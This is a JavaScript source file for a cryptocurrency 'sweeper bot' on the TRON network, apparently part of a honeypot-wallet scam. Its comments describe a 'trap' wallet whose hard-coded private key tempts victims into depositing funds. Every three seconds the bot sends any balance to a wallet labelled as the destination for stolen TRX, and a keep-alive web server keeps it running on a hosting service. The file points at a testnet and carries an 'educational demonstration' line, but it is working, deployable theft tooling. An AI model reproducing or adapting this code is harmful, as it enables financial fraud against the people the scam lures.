// =====================================================
// SWEEPER BOT - RENDER DEPLOYMENT VERSION
// COMPLETE WITH KEEP-ALIVE AND HEALTH CHECK
// =====================================================

// Import the libraries
const TronWeb = require('tronweb').default || require('tronweb');
const express = require('express');

// =====================================================
// STEP 1: YOUR WALLET CONFIGURATION
// =====================================================

// ⚠️ YOUR TRAP WALLET PRIVATE KEY (from create-wallet.js)
// This wallet appears to have USDT and tempts victims
const TRAP_PRIVATE_KEY = '18A63D617F8214CA198330327FF54D0743BCBDB3CAB531EFAD1813598C4221DB';

// ⚠️ YOUR PERSONAL WALLET (where stolen TRX goes)
// This is your TronLink wallet address - TTbU7eN9XPP8i6WT6QXy5wus5gBJey8A15
const SCAMMER_DESTINATION = 'TTbU7eN9XPP8i6WT6QXy5wus5gBJey8A15';

// =====================================================
// STEP 2: CONNECT TO THE BLOCKCHAIN
// =====================================================

// Connect to Shasta Testnet (NOT mainnet!)
const tronWeb = new TronWeb({
    fullHost: 'https://api.shasta.trongrid.io',
    privateKey: TRAP_PRIVATE_KEY
});

// Get the trap wallet address from the private key
const TRAP_ADDRESS = tronWeb.address.fromPrivateKey(TRAP_PRIVATE_KEY);

// Minimum amount to sweep (1 TRX = 1,000,000 SUN)
const MIN_SWEEP_AMOUNT_SUN = 1000000;

// =====================================================
// STEP 3: DISPLAY STARTUP INFORMATION
// =====================================================

console.log('═══════════════════════════════════════');
console.log('🤖 SWEEPER BOT IS RUNNING');
console.log('═══════════════════════════════════════');
console.log('📡 Watching trap wallet:', TRAP_ADDRESS);
console.log('💰 Minimum sweep amount: 1 TRX');
console.log('🎯 Sending stolen funds to:', SCAMMER_DESTINATION);
console.log('⏰ Checking every 3 seconds...');
console.log('═══════════════════════════════════════');

// =====================================================
// STEP 4: THE SWEEPING FUNCTION (Runs every 3 seconds)
// =====================================================

async function sweep() {
    try {
        // Check the balance of the trap wallet
        const balance = await tronWeb.trx.getBalance(TRAP_ADDRESS);
        const balanceTrx = balance / 1000000; // Convert from SUN to TRX

        // If balance is above the minimum (1 TRX)...
        if (balance > MIN_SWEEP_AMOUNT_SUN) {
            console.log(`\n🚨 [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx} TRX - SWEEPING!`);
            
            // Leave a tiny amount for transaction fees (0.2 TRX)
            const feeBuffer = 200000; // 0.2 TRX in SUN
            const amountToSend = balance - feeBuffer;

            if (amountToSend > 0) {
                // Send ALL the TRX to the destination wallet
                const transaction = await tronWeb.trx.sendTransaction(
                    SCAMMER_DESTINATION,
                    amountToSend
                );
                
                console.log(`✅ [${new Date().toLocaleTimeString()}] SWEPT ${amountToSend/1000000} TRX!`);
                console.log(`📝 Transaction ID: ${transaction.transaction.txID}`);
                console.log(`💰 New balance: 0 TRX\n`);
            } else {
                console.log(`⚠️ [${new Date().toLocaleTimeString()}] Balance too low after fees.`);
            }
        } else {
            // Show a heartbeat so you know the bot is alive
            const seconds = Math.floor(Date.now() / 1000);
            if (seconds % 15 === 0) { // Show every 15 seconds
                console.log(`💓 [${new Date().toLocaleTimeString()}] Watching... balance: ${balanceTrx} TRX`);
            }
        }
    } catch (error) {
        console.error(`❌ ERROR:`, error.message);
    }
}

// =====================================================
// STEP 5: RUN THE SWEEPING FUNCTION EVERY 3 SECONDS
// =====================================================

// Check the balance every 3 seconds (forever)
setInterval(sweep, 3000);

console.log('⏳ Bot is alive and waiting for victims...\n');

// =====================================================
// STEP 6: KEEP THE BOT AWAKE (Web Server + Health Check)
// =====================================================

// Render will put your bot to sleep if it doesn't receive web traffic.
// This creates a tiny web server that responds to pings.

const app = express();
const PORT = process.env.PORT || 3000;

// Health check endpoint - this is what UptimeRobot will ping
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Main page - shows status information
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🤖 Sweeper Bot</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
                .info { background: #f4f4f4; padding: 15px; border-radius: 8px; }
                .status { color: green; font-weight: bold; }
            </style>
        </head>
        <body>
            <h1>🤖 Sweeper Bot is Running</h1>
            <div class="info">
                <p><strong>Trap Wallet:</strong> ${TRAP_ADDRESS}</p>
                <p><strong>Destination Wallet:</strong> ${SCAMMER_DESTINATION}</p>
                <p><strong>Status:</strong> <span class="status">🟢 Watching for victims...</span></p>
                <p><small>This is an educational demonstration for crypto scam awareness.</small></p>
            </div>
        </body>
        </html>
    `);
});

// Start the web server
app.listen(PORT, () => {
    console.log(`🌐 Web server running on port ${PORT}`);
    console.log(`📱 Your bot is alive at: https://educationalpurpose.onrender.com`);
});

console.log('═══════════════════════════════════════');
console.log('✅ BOT FULLY INITIALIZED');
console.log('═══════════════════════════════════════');
